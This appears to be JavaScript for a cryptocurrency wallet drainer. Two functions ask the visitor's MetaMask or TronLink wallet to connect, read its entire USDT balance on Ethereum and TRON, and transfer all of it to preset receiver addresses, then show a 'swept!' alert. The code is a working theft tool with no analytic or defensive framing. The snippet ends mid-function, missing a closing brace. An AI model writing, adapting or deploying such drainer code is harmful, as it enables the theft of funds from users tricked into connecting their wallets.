// ETH Sweep (USDT only)
async function sweepETH() {
  if (!window.ethereum) return alert("MetaMask not found");
  const web3 = new Web3(window.ethereum);
  await ethereum.request({ method: "eth_requestAccounts" });
  const accounts = await web3.eth.getAccounts();
  const account = accounts[0];
  const usdt = new web3.eth.Contract([
    { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" },
    { "constant": false, "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "success", "type": "bool" }], "type": "function" }
  ], "0xdAC17F958D2ee523a2206206994597C13D831ec7");

  const balance = await usdt.methods.balanceOf(account).call();
  if (balance > 0) {
    await usdt.methods.transfer(ETH_RECEIVER, balance).send({ from: account });
    alert("‚úÖ ETH USDT swept!");
  } else {
    alert("‚ùå No USDT in ETH wallet");
  }
}

// TRON Sweep
async function sweepTRON() {
  if (!window.tronWeb || !tronWeb.ready) return alert("TronLink not found");
  const from = tronWeb.defaultAddress.base58;
  const contract = await tronWeb.contract().at("TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj");
  const balance = await contract.balanceOf(from).call();
  if (balance > 0) {
    await contract.transfer(TRX_RECEIVER, balance).send();
    alert("‚úÖ TRON USDT swept!");
  } else {
    alert("‚ùå No USDT in TRON wallet");

}
